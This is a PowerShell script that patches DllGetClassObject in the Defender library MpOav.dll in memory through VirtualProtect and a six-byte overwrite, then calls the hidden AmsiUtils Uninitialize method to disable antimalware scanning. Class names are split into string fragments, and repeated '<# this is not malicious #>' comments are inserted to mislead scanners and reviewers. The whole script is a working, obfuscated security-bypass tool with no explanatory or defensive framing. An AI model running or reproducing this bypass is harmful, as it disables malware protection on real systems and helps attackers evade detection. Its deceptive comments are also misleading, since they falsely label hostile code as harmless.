$APIs = @"
using System;
using System.Runtime.InteropServices;
public class APIs {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr ekwiam, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $APIs

$wzys = "0xB8"
$coxo = "0x57"
$hxuu = "0x00"
$eqhh = "0x07"
$paej = "0x80"
$ppiy = "0xC3"
$asdfasd = [Byte[]] ($wzys,$coxo,$hxuu,$eqhh,+$paej,+$ppiy)

$LoadLibrary = [APIs]::LoadLibrary("MpOav.dll")
$zxcasd = [APIs]::GetProcAddress($LoadLibrary,"DllGetClassObject")
$erty = 0
[APIs]::VirtualProtect($zxcasd, [uint32]6, 0x40, [ref]$erty)
[System.Runtime.InteropServices.Marshal]::<# this is not malicious #>Copy($asdfasd, 0, $zxcasd, 6)
$object = [Ref].Assembly.GetType('Sys'+'tem.Ma'<# this is not malicious #>+'nag'+'eme'+'nt.Autom'+<# this is not malicious #>'ati'+<# this is not malicious #>'on.A'+<# this is not malicious #>'ms'+<# this is not malicious #>'iU'<# this is not malicious #>+'t'+'i'<# this is not malicious #>+'ls')
$Uninitialize = $object.GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq Uninitialize
$Uninitialize.Invoke($object,$null) 